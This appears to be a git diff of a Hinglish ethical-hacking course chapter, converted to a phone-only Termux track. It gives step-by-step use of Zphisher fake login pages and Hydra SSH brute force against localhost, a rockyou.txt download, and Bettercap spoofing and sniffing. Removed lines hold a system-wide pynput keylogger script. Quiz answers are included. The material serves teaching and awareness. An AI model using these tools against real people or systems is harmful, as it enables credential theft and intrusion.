@@ -3,9 +3,9 @@
 
 ---
 
-> ## 📱💻 DONO TRACKS — PHONE + PC
-> Yeh chapter **dono type ke students ke liye zaroori hai** — chahe Termux wale ho ya Kali Linux wale.
-> Har topic ke andar 📱 Termux aur 💻 Kali Linux dono ke liye alag sections hain.
+> ## 📱 PHONE TRACK — TERMUX
+> Yeh chapter **Termux (Android phone) wale students ke liye** hai.
+> Chapter 6 (Tools & Languages) complete karne ke baad yahan aao.
 
 ---
 
@@ -25,20 +25,20 @@
 ---
 ---
 
-**badhai ho guys** — Chapter 1 se lekar Chapter 7 tak jo bhi seekha — computer, networking, Linux, Kali, Termux, aur tool/programming language ka concept — woh saari **taiyaari** thi. asli maza ab shuru hota hai.
+**badhai ho guys** — Chapter 1 se lekar Chapter 6 tak jo bhi seekha — computer, networking, Linux, Termux setup, aur tool/programming language ka concept — woh saari **taiyaari** thi. asli maza ab shuru hota hai.
 
-is chapter mein hum har topic mein **ek famous real-world hacking technique** lenge, usko poori tarah samjhenge (kaam kaise karti hai, kyun kaam karti hai), aur uske saath jo **actual tool** use hota hai — usko **Termux aur Kali Linux dono mein install** karna aur **use karna** seekhenge.
+is chapter mein hum har topic mein **ek famous real-world hacking technique** lenge, usko poori tarah samjhenge (kaam kaise karti hai, kyun kaam karti hai), aur uske saath jo **actual tool** use hota hai — usko **apne phone ke Termux mein install** karna aur **use karna** seekhenge.
 
 pehla topic — sabse common aur sabse zyada real-life mein hone wala attack — **Phishing.**
 
 ⚠️ **ek zaroori baat shuru mein hi clear kar dete hain:** yeh chapter tumhe yeh tool **sirf seekhne aur samajhne ke liye** dikha raha hai — taaki tum jaan sako yeh attack kaise hota hai aur **khud ko/logo ko bacha sako.** kisi bhi real insaan pe, uski permission ke bina, yeh tool use karna **illegal** hai. is course mein hum sirf apne khud ke test account/apne banaye demo pe practice karenge.
 
-chalo, welcome karte hain **Chapter 8** mein.
+chalo, welcome karte hain **Chapter 7** mein.
 
 ---
 ---
 
-## 📌 Topic 8.1 — Phishing Technique Aur Zphisher Tool — Termux + Kali
+## 📌 Topic 7.1 — Phishing Technique Aur Zphisher Tool — Termux
 
 ---
 
@@ -72,7 +72,7 @@ ab is technique ko practically samajhne ke liye (sirf apne demo pe, khud pe test
 
 > Zphisher ek **automated phishing tool** hai jo popular websites (Facebook, Instagram, Google, etc.) ke **ready-made fake login pages** already bana ke rakhta hai — tumhe khud page design nahi karna padta, tool khud sab kar deta hai.
 
-yeh tool **Bash script** mein likha gaya hai (Topic 7.2 yaad hai? — yehi wajah hai ki yeh Termux aur Kali dono mein bina kisi jhanjhat ke chal jaata hai, kyunki dono jagah Bash already available hai).
+yeh tool **Bash script** mein likha gaya hai (Topic 6.2 yaad hai? — yehi wajah hai ki yeh Termux mein bina kisi jhanjhat ke chal jaata hai, kyunki Bash already available hai).
 
 ---
 
@@ -107,35 +107,9 @@ aur pehli baar chalane pe yeh khud-ba-khud packages install karna shuru kar deta
 
 ---
 
-### Zphisher install karna — Kali Linux mein
-
-Kali Linux mein bhi bilkul wahi tarika follow karenge — pehle check/install `git`, phir GitHub se clone:
-
-```bash
-sudo apt install git
-```
-
-(zyada tar Kali Linux mein `git` **already pre-installed** aata hai, lekin upar wali command chala kar confirm/install kar lo — agar already hoga toh yeh "already the newest version" bol dega.)
-
-uske baad wahi commands:
-
-```bash
-git clone --depth=1 https://github.com/htr-tech/zphisher.git
-cd zphisher
-bash zphisher.sh
-```
-
-- pehli command — Zphisher ka poora code GitHub se tumhare Kali mein copy kar leti hai.
-- doosri command — usi folder ke andar jaati hai jo clone hua.
-- teesri command — tool ko chalati hai. **pehli baar chalate waqt** yeh khud-ba-khud zaroori dependencies (`curl`, `php`) install kar lega.
-
-> **dhyaan do** — Termux aur Kali dono mein install karne ka tarika ab **bilkul same** hai — `git install karo → git clone karo → cd zphisher → bash zphisher.sh`. bas pehli command (git install karne ka tarika) alag hai (`pkg install git` vs `sudo apt install git`), baaki sab identical hai.
-
----
-
 ### Zphisher use kaise karna hai — step by step
 
-install hone ke baad, jab tum `zphisher` (Termux) ya `bash zphisher.sh` (Kali) chalaoge, ek **menu screen** khulegi:
+install hone ke baad, jab tum `bash zphisher.sh` chalaoge, ek **menu screen** khulegi:
 
 **Step 1 — website choose karo**
 
@@ -151,7 +125,7 @@ kuch websites ke liye multiple page-styles milte hain. jaise Facebook choose kiy
 
 **Step 3 — tunneling option choose karo**
 
-yeh sabse important step hai. tumhara fake page abhi tumhare hi phone/laptop pe chal raha hai (localhost pe) — usko accessible banane ke liye tunneling option choose karna padta hai:
+yeh sabse important step hai. tumhara fake page abhi tumhare hi phone pe chal raha hai (localhost pe) — usko accessible banane ke liye tunneling option choose karna padta hai:
 
 ![Port forwarding options: Localhost, Ngrok, Cloudflared, LocalXpose](../assets/chapter-8-famous-hacking-tools/8.1-05-port-forward.png)
 
@@ -198,7 +172,7 @@ ab us page pe koi bhi details daalo (test ke liye sirf fake details — jaise `d
 
 ### ek line mein
 
-> **Phishing ek fake login page bana ke, victim ko dhoka dekar uske username/password churane ki technique hai — bina koi technical hacking kiye, sirf insaan ke vishwaas ka fayda uthaya jaata hai. Zphisher ek Bash-based tool hai jo yeh fake pages ready-made deta hai — Termux mein `pkg install zphisher` se aur Kali mein GitHub clone karke install hota hai — hamesha sirf apni permission wale demo pe use karna hai.**
+> **Phishing ek fake login page bana ke, victim ko dhoka dekar uske username/password churane ki technique hai — bina koi technical hacking kiye, sirf insaan ke vishwaas ka fayda uthaya jaata hai. Zphisher ek Bash-based tool hai jo yeh fake pages ready-made deta hai — Termux mein `pkg install git` karke GitHub se clone karo aur `bash zphisher.sh` se chalao — hamesha sirf apni permission wale demo pe use karna hai.**
 
 ---
 
@@ -254,15 +228,15 @@ ab us page pe koi bhi details daalo (test ke liye sirf fake details — jaise `d
 
 ---
 
-**Q5.** Kali Linux mein Zphisher install karne ka tarika, Termux ke tarike se kaisa hai?
+**Q5.** Zphisher Termux mein pehli baar chalane pe woh automatically kya karta hai?
 
-- A) bilkul alag hai, koi similarity nahi
-- B) bilkul same hai — git install karo, git clone karo, `cd zphisher`, phir `bash zphisher.sh` — bas git install karne ki command (`pkg` vs `apt`) alag hai
-- C) Kali mein sirf `apt install zphisher` se ho jaata hai
-- D) Kali mein yeh tool chal hi nahi sakta
+- A) Phone restart karta hai
+- B) Khud-ba-khud zaroori dependencies (`curl`, `php`) install kar leta hai
+- C) GitHub account maangta hai login ke liye
+- D) Tool seedha band ho jaata hai
 
 ✅ **Sahi Jawab: B**
-> dono jagah process same hai — git install → git clone → cd zphisher → bash zphisher.sh. sirf git install karne ki command Termux (`pkg`) aur Kali (`apt`) mein alag hai.
+> Zphisher pehli baar `bash zphisher.sh` se chalane pe khud zaroori cheezein install kar leta hai — tumhe alag se kuch nahi karna padta.
 
 ---
 
@@ -310,7 +284,7 @@ ab us page pe koi bhi details daalo (test ke liye sirf fake details — jaise `d
 - D) C++
 
 ✅ **Sahi Jawab: C**
-> Zphisher ek Bash script hai — isiliye Termux aur Kali dono mein bina extra setup ke chal jaata hai, kyunki dono jagah Bash already available hoti hai.
+> Zphisher ek Bash script hai — isiliye Termux mein bina extra setup ke chal jaata hai, kyunki Bash already available hoti hai.
 
 ---
 
@@ -396,7 +370,7 @@ Yeh task do histon mein hai — pehle attacker ki taraf se dekho (apne test pe),
 
 **Hissa 1 — Phishing Demo Karo (sirf apne test account pe)**
 
-1. **Termux ya Kali mein Zphisher install karo** — upar wale steps follow karo.
+1. **Termux mein Zphisher install karo** — upar wale steps follow karo.
 2. Tool chalao: `bash zphisher.sh`
 3. Facebook choose karo (option **01**), phir **Traditional Login Page** (option **01**).
 4. Tunneling option mein **Localhost** (option **01**) choose karo — link sirf tumhare apne device pe hi kaam karega, koi bahar nahi jaayega. Custom port ke liye **N** press karo.
@@ -569,7 +543,7 @@ letmein
 password1
 ```
 
-Kali Linux mein ek famous built-in wordlist aati hai — `/usr/share/wordlists/rockyou.txt` — isme **1.4 crore se zyada real passwords** hain jo ek purane hack mein leak hue the. yahi wordlist aaj bhi brute force attacks mein sabse zyada use hoti hai.
+Termux mein yeh wordlist pehle se nahi aati — lekin tum khud bana sakte ho ya internet se download kar sakte ho. sabse famous wordlist ka naam hai **rockyou.txt** — isme **1.4 crore se zyada real passwords** hain jo ek purane hack mein leak hue the. yahi wordlist aaj bhi brute force attacks mein sabse zyada use hoti hai. Termux mein download karne ke liye: `pkg install curl && curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt`
 
 ---
 
@@ -616,25 +590,19 @@ brute force ke liye sabse famous aur widely used open-source tool hai — **Hydr
 
 > Hydra ek aisa tool hai jo automatically ek ke baad ek password try karta rehta hai — tum bas batao kahan try karna hai (SSH, FTP, web login, etc.), kaunsa username hai, aur kaunsi wordlist use karni hai — baaki sab Hydra khud kar leta hai.
 
-**Kali Linux mein:** Hydra **pehle se install** aata hai — koi install nahi karna.
-
-```bash
-hydra --version
-```
-
-agar nahi hai toh:
-
-```bash
-sudo apt install hydra
-```
-
-**Termux mein:**
+**Termux mein install:**
 
 ```bash
 pkg install hydra
 ```
 
-dono jagah ek hi command chalti hai — syntax same hai.
+verify karo:
+
+```bash
+hydra --version
+```
+
+version number aaya — successfully install hua.
 
 ---
 
@@ -740,27 +708,27 @@ toh jab bhi tumhara phone pe OTP aaye ya galat password pe "too many attempts" d
 
 ---
 
-**Q3. Kali Linux mein famous built-in wordlist kahan hoti hai?**
-
-- A) `/etc/passwords/rockyou.txt`
-- B) `/home/kali/wordlists/rockyou.txt`
-- C) `/usr/share/wordlists/rockyou.txt`
-- D) `/var/hydra/rockyou.txt`
-
-**Sahi Jawab: C**
-> Kali Linux mein `rockyou.txt` — 1.4 crore se zyada leaked real passwords wali file — `/usr/share/wordlists/` mein milti hai.
-
----
-
-**Q4. Hydra tool Termux mein install karne ka sahi command kya hai?**
+**Q3. Termux mein Hydra install karne ka sahi command kya hai?**
 
 - A) `sudo apt install hydra`
-- B) `pip install hydra`
-- C) `apt-get install hydra`
+- B) `apt-get install hydra`
+- C) `pip install hydra`
 - D) `pkg install hydra`
 
 **Sahi Jawab: D**
-> Termux mein package manager `pkg` hota hai — `pkg install hydra` sahi command hai. `sudo apt` Debian/Kali ke liye hai.
+> Termux mein package manager `pkg` hota hai — `pkg install hydra` sahi command hai. `sudo apt` Kali/Debian ke liye hai, Termux mein kaam nahi karta.
+
+---
+
+**Q4. Termux mein rockyou.txt wordlist download karne ke liye kaunsa tool use karte hain?**
+
+- A) `wget` sirf — doosra koi option nahi
+- B) `curl` ya `wget` — dono kaam karte hain
+- C) Wordlist Termux mein already hoti hai, download ki zaroorat nahi
+- D) Browser se manually download karni padti hai
+
+**Sahi Jawab: B**
+> `curl` ya `wget` dono se rockyou.txt download ho sakti hai Termux mein. `pkg install curl` se curl install karo, phir download link se file lo.
 
 ---
 
@@ -884,15 +852,15 @@ toh jab bhi tumhara phone pe OTP aaye ya galat password pe "too many attempts" d
 
 ---
 
-**Q15. Kali Linux mein Hydra already installed hai ya nahi — yeh confirm karne ka command kya hai?**
+**Q15. Termux mein Hydra install hone ke baad uska version check karne ka command kya hai?**
 
 - A) `hydra install --check`
 - B) `hydra --version`
-- C) `sudo check hydra`
-- D) `apt-cache show hydra`
+- C) `pkg check hydra`
+- D) `hydra -status`
 
 **Sahi Jawab: B**
-> `hydra --version` simply tool ka version print karta hai — agar Hydra installed hai toh version number dikhega, nahi hai toh "command not found" error aayega.
+> `hydra --version` tool ka version print karta hai — agar Hydra installed hai toh version number dikhega, nahi hai toh "command not found" error aayega. Termux mein `pkg install hydra` se install karo.
 
 ---
 
@@ -906,32 +874,20 @@ toh jab bhi tumhara phone pe OTP aaye ya galat password pe "too many attempts" d
 
 **Step 1 — Hydra install karo (agar nahi hai)**
 
-Kali Linux mein:
-```bash
-hydra --version
-```
-agar version dikhta hai — already hai, install ki zaroorat nahi.
-nahi dikhta toh:
-```bash
-sudo apt install hydra
-```
-
-Termux mein:
 ```bash
 pkg install hydra openssh
 ```
 
+verify karo:
+```bash
+hydra --version
+```
+
 ---
 
-**Step 2 — Ek test user banao aur weak password set karo**
+**Step 2 — SSH server setup karo**
 
-Kali Linux mein:
-```bash
-sudo adduser testuser
-```
-password poochenga — **`password123`** daalo (jaanboojhkar weak, taaki brute force demo kaam kare).
-
-Termux mein (alag approach — Termux mein users nahi hote, isliye seedha SSH server chalate hain):
+Termux mein users alag nahi hote — seedha SSH server chalate hain:
 ```bash
 sshd
 whoami
@@ -942,14 +898,7 @@ apna username note karo — wahi use hoga.
 
 **Step 3 — SSH server chalu karo**
 
-Kali Linux mein:
-```bash
-sudo systemctl start ssh
-sudo systemctl status ssh
-```
-`Active: active (running)` dikhna chahiye.
-
-Termux mein SSH server ek alag port pe chalta hai (default 8022):
+Termux mein SSH server port 8022 pe chalta hai:
 ```bash
 sshd
 ```
@@ -982,12 +931,7 @@ Save karo: `Ctrl+X` → `Y` → Enter.
 
 **Step 5 — Hydra chalao**
 
-Kali Linux mein:
-```bash
-hydra -l testuser -P mylist.txt ssh://127.0.0.1
-```
-
-Termux mein (port 8022):
+Termux mein SSH port 8022 pe chalta hai:
 ```bash
 hydra -l $(whoami) -P mylist.txt ssh://127.0.0.1 -s 8022
 ```
@@ -1427,9 +1371,9 @@ operating system ke core mein chhup ke baithta hai — sabse dangerous. detect k
 
 isko samajhna zaroori hai kyunki **yahi foundation hai** — poori duniya ke 90% software keyloggers isi concept pe kaam karte hain.
 
-Termux aur Kali dono ke liye alag approach hai — kyunki dono ka environment alag hai. Step by step chalte hain:
+Termux pe koi GUI (X server) nahi hota — isliye hum Python ke built-in `termios` + `tty` modules use karenge. Koi extra library install nahi karni.
 
-> **🔴 important:** `pynput` library Termux mein kaam nahi karti — woh X server (GUI) maangti hai jo Termux mein nahi hota. Isliye Termux ke liye hum Python ke built-in `termios` + `tty` modules use karenge — koi extra install nahi chahiye.
+> **🔴 note:** `pynput` library Termux mein kaam nahi karti — woh X server (GUI) maangti hai jo sirf PC pe hota hai. Termux ke liye built-in modules hi best hain.
 
 ---
 
@@ -1508,73 +1452,7 @@ cat keys.txt
 
 ---
 
-### 💻 Kali Linux ke liye
-
-Kali mein desktop environment hota hai (X server available) — isliye `pynput` seedha kaam karta hai.
-
-**Step 1 — Python aur pynput install karo**
-
-```bash
-sudo apt install python3 python3-pip -y
-pip3 install pynput --break-system-packages
-```
-
-> **"externally-managed-environment" error aa raha hai?** — Modern Kali (2024+) mein yeh normal hai. `--break-system-packages` flag lagate hi install ho jaayega. Koi risk nahi — sirf ek user-level library hai.
-
-**Step 2 — script banao**
-
-```bash
-nano keylogger.py
-```
-
-Yeh code paste karo:
-
-```python
-from pynput.keyboard import Key, Listener
-
-log_file = "keys.txt"
-
-def on_press(key):
-    try:
-        with open(log_file, "a") as f:
-            f.write(str(key.char))
-    except AttributeError:
-        with open(log_file, "a") as f:
-            f.write(f"[{key}]")
-
-print("Keylogger chalu hai... band karne ke liye Ctrl+C dabaao")
-
-try:
-    with Listener(on_press=on_press) as listener:
-        listener.join()
-except KeyboardInterrupt:
-    print("\nKeylogger band ho gaya. keys.txt check karo.")
-```
-
-Save karo: `Ctrl + X` → `Y` → `Enter`
-
-**Step 3 — chalao**
-
-```bash
-python3 keylogger.py
-```
-
-kuch bhi type karo kisi bhi window mein — phir `Ctrl + C` se band karo:
-
-```bash
-cat keys.txt
-```
-
----
-
-**dono scripts kya karti hain — concept:**
-
-| kaam | Termux script | Kali script |
-|---|---|---|
-| keyboard sunna | `termios` + `tty` (built-in) | `pynput` (library) |
-| key capture | terminal ke andar sirf | poore system mein |
-| special keys | `[ENTER]`, `[BACKSPACE]` format | `[Key.enter]` format |
-| extra install | kuch nahi | `pip3 install pynput` |
+**script kya karti hai — concept:**
 
 - `tty.setraw()` — terminal ko raw mode mein daalta hai — har key press seedha milti hai, Enter ka wait nahi
 - `termios.tcgetattr/tcsetattr` — terminal settings save aur restore karta hai — script band hone ke baad terminal normal rehta hai
@@ -2805,12 +2683,7 @@ ek fake WiFi hotspot banana — same naam ka jaise "Cafe_WiFi" — log connect h
 
 MITM attacks ke liye sabse powerful aur popular open-source tool hai **Bettercap**.
 
-> Bettercap ek complete network attack framework hai — ARP spoofing, DNS spoofing, SSL stripping, traffic sniffing — sab ek tool mein. Termux aur Kali Linux dono pe kaam karta hai.
-
-**Kali Linux mein install:**
-```bash
-sudo apt install bettercap
-```
+> Bettercap ek complete network attack framework hai — ARP spoofing, DNS spoofing, SSL stripping, traffic sniffing — sab ek tool mein. Phone ke Termux mein seedha kaam karta hai.
 
 **Termux mein install:**
 ```bash
@@ -2855,7 +2728,7 @@ net.sniff on
 
 ### ek line mein
 
-> **MITM attack mein hacker tumhare aur server ke beech mein baith jaata hai — ARP poisoning se local network traffic intercept karta hai, DNS spoofing se fake sites pe redirect karta hai, SSL stripping se encryption hata deta hai. Bettercap is kaam ka popular tool hai jo Termux aur Kali dono pe kaam karta hai. VPN, HTTPS aur certificate warnings pe dhyaan dena sabse effective defense hai.**
+> **MITM attack mein hacker tumhare aur server ke beech mein baith jaata hai — ARP poisoning se local network traffic intercept karta hai, DNS spoofing se fake sites pe redirect karta hai, SSL stripping se encryption hata deta hai. Bettercap is kaam ka popular tool hai jo Termux pe seedha phone se chalaya ja sakta hai. VPN, HTTPS aur certificate warnings pe dhyaan dena sabse effective defense hai.**
 
 ---
 
@@ -3058,7 +2931,7 @@ net.sniff on
 
 **Step 1 — Apna ARP table dekho**
 
-Kali Linux ya Termux mein:
+Termux mein:
 ```bash
 arp -a
 ```
@@ -3077,13 +2950,6 @@ output kuch aisa hoga:
 
 **Step 2 — Bettercap install karo**
 
-Kali Linux:
-```bash
-sudo apt install bettercap
-bettercap --version
-```
-
-Termux:
 ```bash
 pkg install bettercap
 bettercap --version
